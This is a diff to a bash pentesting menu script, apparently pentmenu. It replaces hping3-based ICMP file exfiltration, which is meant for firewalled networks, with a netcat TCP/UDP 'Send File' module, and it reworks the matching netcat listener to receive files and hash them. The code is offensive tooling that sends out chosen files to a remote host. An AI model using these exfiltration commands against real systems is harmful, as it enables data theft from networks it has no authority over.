@@ -721,15 +721,12 @@ exit 0
 extractionmenu()
 {
 #display a menu for the extraction module using bash select
-        extractionmenu=("Extract File via ICMP" "Receive File via ICMP" "Create Listener" "Go back")
+        extractionmenu=("Send File" "Create Listener" "Go back")
     select extractopt in "${extractionmenu[@]}"; do
-#Extract file via ICMP
-    if [ "$extractopt" = "Extract File via ICMP" ]; then
-        icmpextract
-#Receive file via ICMP
-    elif [ "$extractopt" = "Receive File via ICMP" ]; then
-        icmpreceive
-#Create an arbitrary listener
+#Extract file with TCP or UDP
+    if [ "$extractopt" = "Send File" ]; then
+        sendfile
+#Create an arbitrary listener to receive files
     elif [ "$extractopt" = "Create Listener" ]; then
 		listener
 #Go back
@@ -744,59 +741,44 @@ extractionmenu()
 ##END EXTRACTIONMENU##
 ######################
 
-########################
-##START ICMPEXTRACTION## 
-icmpextract()
-{ echo "This module will help you extract files via the ICMP protocol"
-  echo "It can be handy in a firewalled environment where ICMP is not blocked"
-  echo "You need an ICMP receiver for this to work (you or a friend can set it up via the receiver module)"
-  echo "Enter the receiver IP:"
+##################
+##START SENDFILE##
+sendfile()
+	{ echo "This module will allow you to send a file over TCP or UDP"
+	echo "You can use the Listener to receive such a file"
+echo "Enter protocol, [t]cp (default) or [u]dp:"
+	read -i $PROTO -e PROTO
+	: ${PROTO:=t}
+#if not t (tcp) or u (udp) is chosen, assume tcp required
+if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
+	echo "Invalid protocol option selected, assuming tcp!" && PROTO=t && echo ""
+fi
+echo "Enter the IP of the receving server:"
 #need to know the IP of the receiving end
   read -i $RECEIVER -e RECEIVER
+#need to know a destination port on the server
+  echo "Enter port number for the destination server:"
+	read -i $PORT -e PORT
 #what file are we sending?
-  echo "Enter the FULL PATH of the file you want to extract"
+  echo "Enter the FULL PATH of the file you want to extract:"
   read -i $EXTRACT -e EXTRACT
-#need a passphrase, which must match the one defined by the receiver
-  echo "What is your secret sign? (needs to be same on both ends)"
-  read -i $SECRET -e SECRET
-#extract the file
-  echo "Starting extraction..please be patient!"
-  sudo hping3 $RECEIVER --icmp -d 100 --sign $SECRET --safe --end --file $EXTRACT
-  echo ""
-  echo "Done!"
+#send the file
+echo "Sending the file to $RECEIVER:$PORT"
+if [ "$PROTO" = "t" ]; then
+nc -w 3 -n -N $RECEIVER $PORT < $EXTRACT
+else 
+nc -n -N -u $RECEIVER $PORT < $EXTRACT 
+fi
+echo "Done"
+#generate hashes of file we are sending
+echo "Generating hash checksums"
+md5sum $EXTRACT
+echo ""
+sha512sum $EXTRACT
+sleep 1
 }
-##END ICMPEXTRACTION##
-######################
-
-######################
-##START ICMPRECEIVER##
-icmpreceive()
-{ echo "This module will help you receive files via the ICMP protocol"
-  echo "It can be handy in a firewalled environment where ICMP is not blocked"
-  echo "You need an ICMP extractor for this to work (you or a friend can set it up via the extraction module)"
-  echo "Enter the extractor IP:"
-#need to know the IP of the extractor (sender)
-  read -i $EXTRACTOR -e EXTRACTOR
-  echo "Enter the network interface to listen on:"
-#need to know what interface to isten on
-  read -i $INTERFACE -e INTERFACE
-#need to define where to save output (received data)
-  echo "Enter the output file name:"
-  read -i $OUTFILE -e OUTFILE
-#basic passphrase required for this to work.  Must match extractor (senders) passphrase
-  echo "What is your secret sign? (needs to be same on both ends):"
-  read -i $SECRET -e SECRET
-#start the listener
-  echo "Starting listener.. Ctrl+C to stop when done."
-  sudo hping3 $EXTRACTOR --listen $SECRET -I $INTERFACE --end --safe > $OUTFILE
-#when finished, identify the type of file received (e.g text, binary)
-  echo "Done, checking filetype.."
-  file $OUTFILE
-  echo ""
-  echo "Done!"
-}
-##END ICMPRECEIVER##
-####################
+##END SENDFILE##
+################
 
 ##################
 ##START LISTENER##
@@ -804,7 +786,7 @@ listener()
 	{ echo "This module will create a TCP or UDP listener using netcat"
 	echo "Any data (string or file) received will be written out to ./pentmenu.listener.out"
 echo "Enter protocol, [t]cp (default) or [u]dp:"
-read PROTO
+	read -i $PROTO -e PROTO
 	: ${PROTO:=t}
 #if not t (tcp) or u (udp) is chosen, assume tcp listener required
 if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
@@ -821,8 +803,8 @@ fi
 #it cannot of course listen on a port already in use
 	$LISTPORT -$PROTO -n -l 
 echo "Enter port number to listen on (defaults to 8000):"
-	read PORT
-: ${PORT:=8000}
+	read -i $PORT -e PORT
+	: ${PORT:=8000}
 #if not an integer is entered, assume default port 8000
 if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
 		PORT=8000 && echo "You provided a string, not a port number!  Reverting to port 8000"
@@ -840,14 +822,23 @@ echo "Enter output file (defaults to pentmenu.listener.out):"
 echo "Use ctrl c to stop"
 #create the listener
 if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
-	sudo nc -k -l -v -p $PORT > $OUTFILE
+	sudo nc -n -l -v -p $PORT > $OUTFILE
 elif  [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
-	nc -k -l -v -p $PORT > $OUTFILE
+	nc -n -l -v -p $PORT > $OUTFILE
 elif  [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
-	sudo nc -u -k -l -v -p $PORT > $OUTFILE
+	sudo nc -n -u -k -l -v -p $PORT > $OUTFILE
 elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
-	nc -u -k -l -v -p $PORT > $OUTFILE
+	nc -n -u -k -l -v -p $PORT > $OUTFILE
 fi
+#done message and checksums will only work for tcp file transfer
+#with udp, the connection has to be manually closed with 'ctrl C'
+sync && echo "Done"
+#generate hashes of file received
+echo "Generating hash checksums"
+md5sum $OUTFILE
+echo ""
+sha512sum $OUTFILE
+sleep 1
 }
 ##END LISTENER##
 ################
